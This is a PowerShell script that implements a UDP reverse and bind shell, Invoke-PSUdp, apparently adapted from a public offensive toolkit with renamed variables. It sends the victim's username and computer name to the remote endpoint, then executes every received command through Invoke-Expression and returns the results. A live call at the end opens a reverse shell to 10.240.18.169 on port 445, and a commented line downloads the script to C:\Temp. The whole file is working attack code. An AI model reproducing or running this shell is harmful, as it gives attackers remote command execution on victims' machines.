function Invoke-PSUdp
{          
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $IPv6,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

        
    try 
    {
        
        if ($Reverse)
        {
            $workstation = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPAddress),$Port)

            
            if ($IPAddress -match "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))")
            {
                $santaclaus = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
            }
            else
            {
                $santaclaus = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetwork)
            }
        }

        
       if ($Bind)
        {
            $workstation = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::ANY,$Port)
        
            if ($IPv6)
            {
                $santaclaus = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
            }
            else
            {
                $santaclaus = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetwork)
            }
        
            $santaclaus.Receive([ref]$workstation)
        }

        [byte[]]$bytes = 0..65535|%{0}

        
        $sendbytes = ([text.encoding]::ASCII).GetBytes("User (victim): " + $env:username + " Workstation (location of crime): " + $env:computername + "`n`n")
        $santaclaus.Send($sendbytes,$sendbytes.Length,$workstation)

        
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
        $santaclaus.Send($sendbytes,$sendbytes.Length,$workstation)
    
        while($true)
        {
            $receivebytes = $santaclaus.Receive([ref]$workstation)
            $returndata = ([text.encoding]::ASCII).GetString($receivebytes)
            
            try
            {
                
                $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong!" 
                Write-Error $_
            }

            $sendback = $result +  'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback + $x

            
            $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2)
            $santaclaus.Send($sendbytes,$sendbytes.Length,$workstation)
        }
        $santaclaus.Close()
    }
    catch
    {
        Write-Warning "Something went wrong!" 
        Write-Error $_
    }
}

Invoke-PSUdp -Reverse -IPAddress 10.240.18.169 -Port 445
#Invoke-WebRequest -Uri "https://github.com/pattersonbr/InvokeShellcode/blob/master/Invoke-PowerShellUdp.ps1" -OutFile "C:\Temp\Invoke-PSUdp.ps1"
